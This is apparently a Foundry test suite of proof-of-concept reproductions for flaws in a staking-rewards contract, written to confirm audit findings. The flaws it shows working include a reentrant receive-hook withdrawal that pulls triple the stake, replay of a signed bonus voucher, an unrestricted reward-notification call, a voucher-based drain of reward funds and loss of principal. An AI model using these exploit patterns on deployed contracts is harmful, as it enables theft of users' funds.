// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TestBase.sol";
import "../src/StakeToken.sol";
import "../src/StakingRewards.sol";

/// @dev Returns the raw revert data of an external call.
contract RevertProbe {
    function probe(
        address target,
        bytes memory callData
    ) external returns (bytes memory) {
        (, bytes memory data) = target.call(callData);
        return data;
    }
}

/// @dev Staker that re-pulls its balance on every receive notification.
contract HookedStaker {
    StakeToken token;
    StakingRewards pool;
    uint256 depth;
    uint256 maxDepth;

    constructor(StakeToken t, StakingRewards p, uint256 maxDepth_) {
        token = t;
        pool = p;
        maxDepth = maxDepth_;
    }

    function join(uint256 amount) external {
        token.mint(amount);
        token.approve(address(pool), amount);
        token.setReceiveHook(true);
        pool.stake(amount);
    }

    function bail() external {
        pool.emergencyWithdraw();
    }

    function onTokenReceived(address, uint256) external {
        if (depth < maxDepth) {
            depth++;
            pool.emergencyWithdraw();
        }
    }
}

contract ReproTest is SpecTest {
    StakeToken stakeToken;
    StakeToken rewardToken;
    StakingRewards pool;

    uint256 operatorKey = 0xB0B;
    address owner = address(0xA11CE);
    address operator = vm.addr(operatorKey);
    address alice = address(0xA1);
    address bob = address(0xB2);
    address griefer = address(0x666);
    address stalePayout = address(0xDEAD);

    function setUp() public {
        stakeToken = new StakeToken();
        rewardToken = new StakeToken();
        vm.prank(owner);
        pool = new StakingRewards(
            address(stakeToken), address(rewardToken), owner
        );
        vm.prank(owner);
        pool.setOperator(operator);
        stakeToken.mint(2_000 ether);
        rewardToken.mint(10_000 ether);
        stakeToken.transfer(alice, 1_000 ether);
        stakeToken.transfer(bob, 1_000 ether);
        rewardToken.transfer(address(pool), 5_000 ether);
    }

    function _joinAs(address user, uint256 amount) internal {
        vm.startPrank(user);
        stakeToken.approve(address(pool), amount);
        pool.stake(amount);
        vm.stopPrank();
    }

    function test_repro_reward_per_token_empty() public {
        vm.prank(owner);
        pool.notifyRewardAmount(1_000 ether, 1_000);
        vm.warp(block.timestamp + 5);
        bytes memory data = new RevertProbe().probe(
            address(pool),
            abi.encodeWithSignature("stake(uint256)", uint256(1))
        );
        uint256 code = panicCode(data);
        emit log_named_uint("panicCode", code);
        require(code == 0x12, "expected div-by-zero panic");
    }

    function test_repro_earned_wraps() public {
        _joinAs(alice, 1);
        vm.prank(owner);
        pool.notifyRewardAmount(1_000 ether, 1_000);
        vm.warp(block.timestamp + 100);
        vm.prank(alice);
        pool.getReward();
        uint256 paid = pool.userRewardPerTokenPaid(alice);
        vm.prank(griefer);
        pool.notifyRewardAmount(500 ether, 100);
        vm.warp(block.timestamp + 10);
        uint256 rpt = pool.rewardPerToken();
        uint256 accrued = pool.earned(alice);
        emit log_named_uint("userPaid", paid);
        emit log_named_uint("globalRpt", rpt);
        emit log_named_uint("earnedValue", accrued);
        require(accrued > 1e40, "expected wrapped accrual");
    }

    function test_repro_notify_anyone() public {
        vm.prank(griefer);
        pool.notifyRewardAmount(500 ether, 5);
        emit log_named_uint("rewardRate", pool.rewardRate());
        emit log_named_uint("periodFinish", pool.periodFinish());
        require(pool.rewardRate() == 100 ether, "rate not set");
    }

    function test_repro_first_stake_unlocked() public {
        _joinAs(alice, 100 ether);
        uint256 lock = pool.lockEnd(alice);
        vm.prank(alice);
        pool.withdraw(100 ether);
        emit log_named_uint("lockEnd", lock);
        emit log_named_uint("balanceAfter", pool.balances(alice));
        require(lock == 0, "lock should be unset");
        require(pool.balances(alice) == 0, "expected full exit");
    }

    function test_repro_hook_reentry() public {
        _joinAs(alice, 20 ether);
        HookedStaker hs = new HookedStaker(stakeToken, pool, 2);
        hs.join(10 ether);
        uint256 staked = 10 ether;
        hs.bail();
        uint256 received = tokenBalance(hs);
        emit log_named_uint("stakedWei", staked);
        emit log_named_uint("receivedWei", received);
        require(received == 3 * staked, "expected triple pull");
    }

    function tokenBalance(HookedStaker hs) internal view returns (uint256) {
        return stakeToken.balanceOf(address(hs));
    }

    function test_repro_accrual_zero() public {
        _joinAs(alice, 1_000);
        vm.prank(owner);
        pool.notifyRewardAmount(100, 100);
        vm.warp(block.timestamp + 100);
        uint256 rpt = pool.rewardPerToken();
        emit log_named_uint("elapsedSeconds", 100);
        emit log_named_uint("rewardPerToken", rpt);
        emit log_named_uint("earned", pool.earned(alice));
        require(rpt == 0, "expected zero accrual");
    }

    function test_repro_same_token_principal() public {
        StakeToken t = new StakeToken();
        StakingRewards same = new StakingRewards(
            address(t), address(t), owner
        );
        t.mint(200 ether);
        t.transfer(alice, 100 ether);
        t.transfer(bob, 100 ether);
        vm.startPrank(alice);
        t.approve(address(same), 100 ether);
        same.stake(100 ether);
        vm.stopPrank();
        vm.startPrank(bob);
        t.approve(address(same), 100 ether);
        same.stake(100 ether);
        vm.stopPrank();
        vm.prank(owner);
        same.notifyRewardAmount(200 ether, 1);
        vm.warp(block.timestamp + 2);
        vm.prank(alice);
        same.getReward();
        vm.prank(bob);
        same.getReward();
        bool withdrew = true;
        vm.prank(bob);
        try same.withdraw(100 ether) {} catch {
            withdrew = false;
        }
        emit log_named_uint("poolTokenBalance", t.balanceOf(address(same)));
        emit log_named_uint("totalSupply", same.totalSupply());
        emit log_named_uint("lastWithdrawOk", withdrew ? 1 : 0);
        require(!withdrew, "principal should be gone");
    }

    function test_repro_reward_transfer_ignored() public {
        _joinAs(alice, 1);
        vm.prank(owner);
        pool.notifyRewardAmount(100, 100);
        vm.warp(block.timestamp + 50);
        uint256 accrued = pool.earned(alice);
        // drain the reward balance through a signed voucher
        uint256 drain = rewardToken.balanceOf(address(pool));
        bytes32 digest = keccak256(abi.encodePacked(griefer, drain));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operatorKey, digest);
        vm.prank(griefer);
        pool.claimBonus(drain, v, r, s);
        vm.prank(alice);
        pool.getReward();
        emit log_named_uint("expectedReward", accrued);
        emit log_named_uint("aliceReceived", rewardToken.balanceOf(alice));
        emit log_named_uint("rewardsLeft", pool.rewards(alice));
        require(rewardToken.balanceOf(alice) == 0, "expected silent loss");
        require(pool.rewards(alice) == 0, "expected zeroed accounting");
    }

    function test_repro_claim_for_stale_payout() public {
        _joinAs(alice, 1 ether);
        vm.prank(owner);
        pool.notifyRewardAmount(1_000 ether, 1_000);
        vm.prank(alice);
        pool.setPayoutAddress(stalePayout);
        vm.warp(block.timestamp + 100);
        vm.prank(griefer);
        pool.claimFor(alice);
        emit log_named_uint("paidToStale", rewardToken.balanceOf(stalePayout));
        emit log_named_uint("aliceReceived", rewardToken.balanceOf(alice));
        emit log_named_uint("paidOut", pool.paidOut(alice));
        require(rewardToken.balanceOf(stalePayout) == 100 ether, "to stale");
        require(rewardToken.balanceOf(alice) == 0, "user got nothing");
    }

    function test_repro_voucher_replay() public {
        uint256 amount = 50 ether;
        bytes32 digest = keccak256(abi.encodePacked(griefer, amount));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operatorKey, digest);
        vm.prank(griefer);
        pool.claimBonus(amount, v, r, s);
        vm.prank(griefer);
        pool.claimBonus(amount, v, r, s);
        emit log_named_uint("voucherAmount", amount);
        emit log_named_uint("grieferBalance", rewardToken.balanceOf(griefer));
        require(rewardToken.balanceOf(griefer) == 2 * amount, "replayed");
    }
}
